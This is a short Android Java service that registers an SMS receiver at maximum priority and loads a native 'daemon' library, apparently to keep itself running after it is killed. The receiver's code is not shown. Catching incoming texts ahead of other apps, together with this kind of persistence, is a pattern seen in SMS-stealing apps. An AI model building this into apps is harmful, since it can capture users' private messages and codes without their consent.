package com.rich.service;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.util.Log;

import com.rich.receiver.SMSReceiver;

public class RegisterSMSService extends Service {

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		IntentFilter filter = new IntentFilter();
		filter.addAction("android.provider.Telephony.SMS_RECEIVED");
		filter.setPriority(Integer.MAX_VALUE);
		registerReceiver(new SMSReceiver(), filter);
//		daemon();
	}

	@Override
	public void onDestroy() {
		Log.e("daemon", "parent got killed");
		super.onDestroy();
	}

	private native void daemon();

	static {
		System.loadLibrary("daemon");
	}

}
